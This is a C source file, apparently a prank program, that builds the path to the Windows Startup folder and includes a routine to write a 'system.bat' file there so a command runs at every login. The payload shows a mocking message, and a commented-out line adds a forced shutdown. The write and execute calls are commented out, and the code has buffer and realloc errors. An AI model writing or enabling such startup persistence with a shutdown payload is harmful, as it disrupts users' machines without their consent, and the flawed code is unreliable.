/*
	CREATED BY SHAIL
	Tuesday, 6 July 2021
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void get_STARTUP(char ** startup_PATH);
void attach_STARTUP(char * startup_PATH, char * execute);

int main()
{
	// Command to execute
	// char execute[] = "msg * Ha Ha Ha! && shutdown /s /f /t 3";
	char execute[] = "msg * Ha Ha Ha!";

	char * startup_PATH = NULL;
	startup_PATH = (char *)malloc(100); // Allocate 100 bytes of memory
	
	// QUIT program if memory allocation failed
	if (startup_PATH == NULL)
	{
		puts("MEMORY ALLOCATION FAILED");
		return -1;
	}
	strcpy(startup_PATH, "Shail");
	// Getting startup directory path
	puts(startup_PATH);
	get_STARTUP(&startup_PATH);
	puts(startup_PATH);
	// Write file to startup directory
	// attach_STARTUP(startup_PATH, execute);

	// Execute the commands which is wriiten in startup FILE
	// system(execute);

	return 1;
}


void get_STARTUP(char ** startup_PATH)
{
	FILE * cmd;
	// Get USER directory path
	cmd = popen("echo %USERPROFILE%", "r");
	fgets(*startup_PATH, 50, cmd);
	pclose(cmd);

	// Removing \n from echo
	(*startup_PATH)[strlen(*startup_PATH)-1] = '\0';
	// Merge User directory path with startup directory
	sprintf(*startup_PATH, "%s\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\system.bat", *startup_PATH);
	// Reallocate memory according to new size
	startup_PATH = realloc(*startup_PATH, strlen(*startup_PATH)+1);
}


void attach_STARTUP(char * startup_PATH, char * execute)
{
	FILE * startup;
	startup = fopen(startup_PATH, "w");
	// Write file to start at startup
	fputs(execute, startup);
	fclose(startup);
}